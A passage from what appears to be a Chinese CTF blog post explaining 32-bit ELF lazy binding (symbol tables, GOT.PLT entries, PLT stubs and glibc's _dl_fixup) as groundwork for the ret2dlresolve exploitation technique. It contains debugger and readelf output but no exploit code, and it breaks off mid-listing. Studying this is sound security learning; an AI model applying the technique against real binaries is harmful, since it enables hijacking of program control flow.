<p>​	重定位类型最常见全局变量的R_386_GLOB_DAT和全局函数的R_386_JUMP_SLOT</p>
<p>​	符号下标索引.dynsym节</p>
<p>比如<code>write</code>的索引是3,</p>
<p><code>libc_start_main</code>的索引是2</p>
<p><code>__gmon_start__</code>的索引是1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># readelf -s test</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains <span class="number">5</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND write@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">080484</span>ec     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">16</span> _IO_stdin_used</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">70</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">		...</span><br><span class="line">    <span class="number">32</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    <span class="number">33</span>: <span class="number">08048370</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> deregister_tm_clones</span><br><span class="line">    <span class="number">34</span>: <span class="number">080483b</span>0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> register_tm_clones</span><br><span class="line">    <span class="number">35</span>: <span class="number">080483f</span>0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> __do_global_dtors_aux</span><br><span class="line">    <span class="number">36</span>: <span class="number">0804</span>a01c     <span class="number">1</span> OBJECT  LOCAL  DEFAULT   <span class="number">25</span> completed<span class="number">.7283</span></span><br><span class="line">    <span class="number">37</span>: <span class="number">08049f</span>10     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">20</span> __do_global_dtors_aux_fin</span><br><span class="line">    <span class="number">38</span>: <span class="number">08048420</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> frame_dummy</span><br><span class="line">    <span class="number">39</span>: <span class="number">08049f</span>0c     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">19</span> __frame_dummy_init_array_</span><br><span class="line">    <span class="number">40</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS test.c</span><br><span class="line">	...</span><br><span class="line">    <span class="number">66</span>: <span class="number">08048426</span>    <span class="number">64</span> FUNC    GLOBAL DEFAULT   <span class="number">14</span> main</span><br><span class="line">    <span class="number">67</span>: <span class="number">08048466</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">14</span> __x86.get_pc_thunk.ax</span><br><span class="line">    <span class="number">68</span>: <span class="number">0804</span>a01c     <span class="number">0</span> OBJECT  GLOBAL HIDDEN    <span class="number">24</span> __TMC_END__</span><br><span class="line">    <span class="number">69</span>: <span class="number">080482</span>ac     <span class="number">0</span> FUNC    GLOBAL DEFAULT   <span class="number">11</span> _init</span><br></pre></td></tr></table></figure>

<p>readelf -s会读取两个表,一个是本地符号表symtab,一个是链接符号表.dynsym</p>
<p>这个symtab可以strip掉,不影响程序执行</p>
<p>而实际上这两个符号表的表项中并没有Name数组,st_name是一个索引,索引字符串表.strtab</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;        /* Symbol name (string tbl index) */</span><br><span class="line">  Elf32_Addr    st_value;       /* Symbol value */</span><br><span class="line">  Elf32_Word    st_size;        /* Symbol size */</span><br><span class="line">  unsigned char st_info;        /* Symbol type and binding */</span><br><span class="line">  unsigned char st_other;       /* Symbol visibility */</span><br><span class="line">  Elf32_Section st_shndx;       /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1C7Ch: 00 63 72 74 73 74 75 66 66 2E 63 00 64 65 72 65  .crtstuff.c.dere </span><br><span class="line">1C8Ch: 67 69 73 74 65 72 5F 74 6D 5F 63 6C 6F 6E 65 73  gister_tm_clones </span><br><span class="line">1C9Ch: 00 5F 5F 64 6F 5F 67 6C 6F 62 61 6C 5F 64 74 6F  .__do_global_dto </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>比如crtstuff.c的符号表项Elf32_Sym中,st_name&#x3D;1,对应0x1c7c+1</p>
<p>比如deregister_tm_clones的符号表项Elf32_Sym中,st_name&#x3D;c,对应0x1c7c+c</p>
<p>这里0x1c7c是.strtab节在文件中的偏移量,可以使用readelf -S查看对应节区</p>
</blockquote>
<h4 id="GOT-PLT-1-link-map-ld"><a href="#GOT-PLT-1-link-map-ld" class="headerlink" title=".GOT.PLT[1]&#x3D;link_map @ ld"></a>.GOT.PLT[1]&#x3D;link_map @ ld</h4><p>.GOT.PLT[1]和.GOT.PLT[2]在编译链接时无法决定是啥，只有在运行时才会知道是什么</p>
<p>.GOT.PLT[1]用于存放<strong>主模块的</strong>link_map数据结构的地址</p>
<p>每个模块(主模块以及所有加载的动态库)都各自有一个link_map</p>
<p>这个link_map保存了对应模块的诸多信息,比如各个节区的地址,elf头的地址,模块名等</p>
<h4 id="GOT-PLT-2-dl-runtime-resolve-ld"><a href="#GOT-PLT-2-dl-runtime-resolve-ld" class="headerlink" title=".GOT.PLT[2]&#x3D;dl_runtime_resolve @ ld"></a>.GOT.PLT[2]&#x3D;dl_runtime_resolve @ ld</h4><p>存放dl_runtime_resolve的地址</p>
<h4 id="GOT-PLT-3"><a href="#GOT-PLT-3" class="headerlink" title=".GOT.PLT[3+]"></a>.GOT.PLT[3+]</h4><p>第四项及之后,该表用于保存函数的虚拟地址</p>
<h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>每个函数的plt表都有三项</p>
<p>jmp</p>
<p>push</p>
<p>jmp</p>
<p>这里第一个jmp调试观察是到push这行</p>
<p>第二个jmp是到dl_runtime_resolve函数中</p>
<p>那么中间push了什么呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//____libc_start_main</span><br><span class="line">.plt:080482E0 FF 25 0C A0 04 08                             jmp     ds:off_804A00C</span><br><span class="line">.plt:080482E6 68 00 00 00 00                                push    0</span><br><span class="line">.plt:080482EB E9 E0 FF FF FF                                jmp     sub_80482D0</span><br><span class="line"></span><br><span class="line">//write</span><br><span class="line">.plt:080482F0 FF 25 10 A0 04 08                             jmp     ds:off_804A010</span><br><span class="line">.plt:080482F6 68 08 00 00 00                                push    8</span><br><span class="line">.plt:080482FB E9 D0 FF FF FF                                jmp     sub_80482D0</span><br></pre></td></tr></table></figure>

<p>符号又到底是如何解析并且回填到GOT表的呢?</p>
<p>为了解决这些问题,以及学习ret2dlresolve的原理,</p>
<p>下面我们阅读<code>_dl_fixup</code>的源码寻找答案</p>
<h2 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_dl_fixup"></a>_dl_fixup</h2><p>以write为例，观察该符号是如何解析的</p>
<p>解析符号发生在<code>_dl_fixup</code>函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (<span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>

<p>该函数有两个参数，其中<code>link_map *l</code>参数就是<code>.got.plt[1]</code>,</p>
<p>参数reloc_arg是目标函数在.rel.plt中的偏移量</p>
<p>reloc_arg在write@plt中被压入栈中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80483a0</span> &lt;write@plt&gt;:       jmp    DWORD PTR ds:<span class="number">0x80498d4</span></span><br><span class="line"><span class="number">0x80483a6</span> &lt;write@plt+<span class="number">6</span>&gt;:     push   <span class="number">0x20</span></span><br><span class="line"><span class="number">0x80483ab</span> &lt;write@plt+<span class="number">11</span>&gt;:    jmp    <span class="number">0x8048350</span></span><br></pre></td></tr></table></figure>

<p>然后跳转到<code>plt[0]=0x8048350</code>，这是<code>_dl_runtime_resolve</code>的导火索，在这里首先将<code>link_map *l</code>压入栈中,然后跳转_<code>dl_runtime_resolve</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x8048350</span>                              push   dword ptr [<span class="number">0x80498bc</span>]</span><br><span class="line">  <span class="number">0x8048356</span>                              jmp    dword ptr [<span class="number">0x80498c0</span>]       &lt;_dl_runtime_resolve&gt;</span><br></pre></td></tr></table></figure>

<p>在<code>_dl_runtime_resolve</code>中,这两个参数又改用<code>eax(link_map *l)</code>和<code>edx(reloc_arg)</code>传递,稍微违背了x86调用约定,但是问题不大</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve:</span><br><span class="line">	cfi_adjust_cfa_offset (<span class="number">8</span>)</span><br><span class="line">	_CET_ENDBR</span><br><span class="line">	pushl %eax		# Preserve registers otherwise clobbered.</span><br><span class="line">	cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">	pushl %ecx</span><br><span class="line">	<span class="title function_">cfi_adjust_cfa_offset</span> <span class="params">(<span class="number">4</span>)</span></span><br><span class="line">	pushl %edx</span><br><span class="line">	<span class="title function_">cfi_adjust_cfa_offset</span> <span class="params">(<span class="number">4</span>)</span></span><br><span class="line">	movl 16<span class="params">(%esp)</span>, %edx	# Copy args pushed by PLT in <span class="keyword">register</span>.  Note</span><br><span class="line">	movl 12<span class="params">(%esp)</span>, %eax	<span class="meta"># that `fixup<span class="string">&#x27; takes its parameters in regs.</span></span></span><br><span class="line"><span class="string"><span class="meta">	call _dl_fixup		# Call resolver.</span></span></span><br></pre></td></tr></table></figure>



<p><code>_dl_runtime_resolve</code>实际上只是一个包装函数,实际工作是<code>_dl_fixup</code>完成的</p>
<p><code>_dl_fixup</code>干了啥呢?</p>
<p><code>_dl_fixup</code>知道两件事,</p>
<p>一个是主程序模块的<code>link_map</code>,这玩意儿保存了很多信息,包括它属于哪个模块,该模块的elf信息等等</p>
<p>一个进程所有模块的<code>link_map</code>以双向链表连接</p>
<blockquote>
<p>每个模块(主程序和每个so库)各自有一个link_map</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/s l.l_name</span><br><span class="line">$<span class="number">8</span> = <span class="number">0xf7ffdd2c</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_name</span><br><span class="line">$<span class="number">9</span> = <span class="number">0xf7fc828c</span> <span class="string">&quot;linux-gate.so.1&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_name</span><br><span class="line">$<span class="number">10</span> = <span class="number">0xf7fc2390</span> <span class="string">&quot;/home/glibc32/lib/libc.so.6&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_next.l_name</span><br><span class="line">$<span class="number">11</span> = <span class="number">0x8046174</span> <span class="string">&quot;/home/glibc32/lib/ld-linux.so.2&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_next.l_next.l_name</span><br><span class="line">Cannot access memory at address <span class="number">0x4</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>另一个就是reloc_arg,也就是他要解析的函数符号,在.rel.plt节区中的偏移</p>
<p>显然抛开基地址谈偏移量是没有意义的,因此下面要做的第一件事是找到.rel.plt的基地址</p>
<p>怎么找呢?</p>
<p>大体步骤如下伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(<span class="keyword">struct</span> link_map *l,ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1.找到dynamic节,1-&gt;1l_info就是dynamic节,</span></span><br><span class="line">    <span class="comment">//从dynamic节中找到.rel.plt节记为reloc</span></span><br><span class="line">    <span class="comment">//从dynamic节中找到符号表symtab,</span></span><br><span class="line">    <span class="comment">//从dynamic节中找到字符串表strtab</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 2.使用reloc_arg配合reloc表找到该表中的具体项目Elf32_Rel</span></span><br><span class="line">    <span class="comment">//        typedef struct&#123;</span></span><br><span class="line">    <span class="comment">//            Elf32_Addr  r_offset;       //符号要填充的got表项的虚拟地址</span></span><br><span class="line">    <span class="comment">//            Elf32_Word  r_info;         //符号在符号表中的下标</span></span><br><span class="line">    <span class="comment">//        &#125; Elf32_Rel;</span></span><br><span class="line">	<span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 3.找到符号表对应表项</span></span><br><span class="line">    <span class="comment">//        typedef struct &#123;</span></span><br><span class="line">    <span class="comment">//            Elf32_Word	st_name;	//符号名字符串在字符串表中的偏移</span></span><br><span class="line">    <span class="comment">//            Elf32_Addr	st_value;	//符号在其所在模块中的偏移量</span></span><br><span class="line">    <span class="comment">//            Elf32_Word	st_size;</span></span><br><span class="line">    <span class="comment">//            unsigned char	st_info;</span></span><br><span class="line">    <span class="comment">//            unsigned char	st_other;</span></span><br><span class="line">    <span class="comment">//            Elf32_Half	st_shndx;</span></span><br><span class="line">    <span class="comment">//        &#125; Elf32_Sym;</span></span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 4.解析符号</span></span><br><span class="line">    <span class="comment">//从strtab偏移Elf32_Sym.st_name处找到符号名,</span></span><br><span class="line">    <span class="comment">//从链表相接的各个模块的link_map入手,遍历各个模块,寻找该符号名,如果找到,result返回对应模块的link_map</span></span><br><span class="line">    <span class="comment">//同时sym废物利用,从对应模块的符号表中抄了同名的符号过来,但是这个符号是有虚拟地址的</span></span><br><span class="line">	result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// result中保存着目标模块的基地址,加上目标符号的偏移量,得到该符号纯纯的虚拟地址,放到value里</span></span><br><span class="line">    <span class="comment">// 这里DL_FIXUP_MAKE_VALUE(map,addr) = addr,纯纯弱智</span></span><br><span class="line">	value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5.回写GOT表</span></span><br><span class="line">    <span class="comment">//最后把value写入相应的GOT表条目中,rel_addr就是GOT地址</span></span><br><span class="line">	<span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在图上意思意思</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193758449.png" alt="image-20240819193758449"></p>
<p>下面详细说明每一步</p>
<h3 id="1-由主模块link-map找dynamic节"><a href="#1-由主模块link-map找dynamic节" class="headerlink" title="1.由主模块link_map找dynamic节"></a>1.由主模块link_map找dynamic节</h3><p>这个<code>link_map</code>中有一个成员叫<code>l_info</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.		dynamic节的索引指针</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">   	...</span><br></pre></td></tr></table></figure>

<p><code>l_info</code>的类型是<code>ElfW(Dyn)**</code>,也就是<code>Elf32_Dyn**</code>，这是一个二级指针，或者说数组指针</p>
<p>意思是在内存某个地方有一个<code>dynamic</code>数组，然后这个指针指向数组的基地址</p>
<p>在运行时<code>l_info</code>指向所在模块的的<code>dynamic</code>节</p>
<p><code>dynamic</code>节加载进入内存的地址是确定的，比如本程序中在<code>0x080497c4</code>,可以使用<code>readelf -S</code>查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/dustball/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">32</span>/no-relro]</span><br><span class="line">└─<span class="meta"># readelf -S main_no_relro_32</span></span><br><span class="line">There are <span class="number">30</span> section headers, starting at offset <span class="number">0x10b0</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">	...</span><br><span class="line">  [<span class="number">21</span>] .dynamic          DYNAMIC         <span class="number">080497</span>c4 <span class="number">0007</span>c4 <span class="number">0000e8</span> <span class="number">08</span>  WA  <span class="number">6</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>在<code>GOT.PLT</code>表的最头部,也保存着一个<code>_DYNAMIC</code>的指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GOT.PLT[0] =&gt; _DYNAMIC</span><br><span class="line">GOT.PLT[1] =&gt; link_map</span><br><span class="line">GOT.PLT[2] =&gt; dl_runtime_resolve</span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<p>dynamic节中的内容可以用<code>readelf -d</code>查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/dustball/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">32</span>/no-relro]</span><br><span class="line">└─<span class="meta"># readelf -d main_no_relro_32</span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset <span class="number">0x7c4</span> contains <span class="number">24</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x804832c</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x8048634</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x80497bc</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x80497c0</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x804818c</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804824c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">107</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x80498b8</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">40</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     REL</span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x8048304</span></span><br><span class="line"> <span class="number">0x00000011</span> (REL)                        <span class="number">0x80482ec</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x80482cc</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x80482b8</span></span><br><span class="line"> <span class="number">0x00000000</span> (<span class="literal">NULL</span>)                       <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>每一项都是一个<code>Elf32_Dyn</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080497C4 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:080497C4                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:080497C4                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:080497CC                 Elf32_Dyn &lt;0Ch, &lt;804832Ch&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:080497D4                 Elf32_Dyn &lt;0Dh, &lt;8048634h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:080497DC                 Elf32_Dyn &lt;19h, &lt;80497BCh&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:080497E4                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:080497EC                 Elf32_Dyn &lt;1Ah, &lt;80497C0h&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:080497F4                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:080497FC                 Elf32_Dyn &lt;6FFFFEF5h, &lt;804818Ch&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049804                 Elf32_Dyn &lt;5, &lt;804824Ch&gt;&gt; 